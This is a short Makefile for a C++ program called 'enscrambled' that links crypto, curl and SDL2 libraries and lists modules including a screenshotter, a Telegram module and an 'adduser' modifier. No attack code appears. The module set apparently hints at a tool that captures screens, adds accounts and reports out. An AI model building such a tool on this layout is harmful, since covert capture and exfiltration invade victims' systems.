CXX := g++
CXXFLAGS := -std=c++17 -Wall -Wextra -O2
LDFLAGS := -lcrypto -lcurl -lpthread -lSDL2

SOURCES := main.cpp \
           htmlgen.cpp \
           audio/happy_birthday.cpp \
           audio/beep.cpp \
           modifiers/adduser.cpp \
           modifiers/greetings.cpp \
           screenshotter.cpp \
           telegram.cpp

OBJECTS := $(SOURCES:.cpp=.o)
TARGET := enscrambled

all: $(TARGET)

$(TARGET): $(OBJECTS)
	$(CXX) $(CXXFLAGS) -o $@ $(OBJECTS) $(LDFLAGS)

%.o: %.cpp
	$(CXX) $(CXXFLAGS) -c $< -o $@

clean:
	rm -f $(TARGET) $(OBJECTS)

.PHONY: all clean

